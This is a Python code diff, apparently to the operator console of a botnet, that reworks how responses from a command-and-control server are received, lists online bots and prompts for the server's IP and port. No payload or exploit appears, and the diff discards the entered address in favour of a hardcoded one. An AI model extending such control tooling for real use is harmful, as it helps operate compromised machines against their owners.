@@ -6,6 +6,7 @@ from threading import Thread
 import os
 import time
 from pathlib import Path
+import re
 
 default_buff_l = 5000
 check = True
@@ -19,16 +20,31 @@ def get_online_bots(respond):
         online_bots.append(respond[:respond.find('\t')])
 
 
-def listen_for_respond(tcpsock, n_bots):
+def get_respond(client) -> str:
+    length = client.recv(5000).decode('utf-8')
+    print("Length: " + length)
+    respond = ''
+    val = ''
     i = 0
-    while i != int(n_bots):
-        respond = tcpsock.recv(default_buff_l).decode('utf-8')
-        print(respond)
+    while i < int(length):
+        val += client.recv(1024).decode('utf-8')
+        respond += val
+        i += len(val)
+        val = ''
+    return respond
 
-        if 'online Bots' in respond:
-            get_online_bots(respond)
 
-        i += 1
+def listen_for_respond(client, n_bots):
+    # i = 0
+    #  while i != int(n_bots):
+        # respond = client.recv(default_buff_l).decode('utf-8')
+        # print(respond)
+    respond = get_respond(client)
+    print(respond)
+    if 'online Bots' in respond:
+        get_online_bots(respond)
+
+    # i += 1
 
 
 def get_file(client, file_name):
@@ -89,7 +105,6 @@ def listener(host, port):
 
     except Exception as ex:
         if 'WinError' in str(ex):
-            print(port)
             print('[-] Cannot connect to the server...')
             print('[*] Make sure that server is up and running...')
             print('[*] Closing the program...')
@@ -97,7 +112,6 @@ def listener(host, port):
             exit(0)
         else:
             print(ex)
-            #  exit(0)
 
     return tcp_sock
 
@@ -123,7 +137,38 @@ def file_exist(filename) -> bool:
     return exist
 
 
+def contains_dots(ip_addr):
+    number_of_dots = 0
+    for str in ip_addr:
+        if str == '.':
+            number_of_dots += 1
+    if number_of_dots == 3:
+        return True
+    else:
+        return False
+
+
+def get_address():
+    while True:
+        host = str(input("Please import IP address of CnC server:"))
+        if not re.match(r'^\d+(\.\d+)*$', host) or contains_dots(host) is False:
+            print('[-] Invalid IP address, try again...')
+            continue
+        else:
+            break
+    while True:
+        port = str(input("Please import the number of port of CnC server:"))
+        if not re.match('^[0-9]*$', port):
+            print('[-] Invalid port number is given, try again...')
+            continue
+        else:
+            break
+
+    return host, port
+
+
 def main():
+    host, port = get_address()
     host = '127.0.0.1'
     port = 8081
 
